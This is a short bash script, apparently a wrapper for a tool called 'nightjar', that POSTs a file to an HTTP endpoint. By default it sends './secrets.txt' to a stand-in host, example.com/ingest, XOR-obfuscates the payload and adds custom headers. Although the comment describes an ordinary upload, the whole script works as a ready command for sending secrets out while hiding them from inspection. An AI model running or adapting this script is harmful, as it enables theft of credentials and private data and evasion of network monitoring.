#!/usr/bin/env bash
# POST a file to an HTTP endpoint as a base64 JSON envelope.
set -euo pipefail

FILE="${1:-./secrets.txt}"
ENDPOINT="${2:-https://example.com/ingest}"

nightjar send "$ENDPOINT" \
  --method POST \
  --payload-file "$FILE" \
  --framing json \
  --header "X-Post: laptop" \
  --header "X-Tool: nightjar" \
  --xor 0x5a \
  --timeout 15
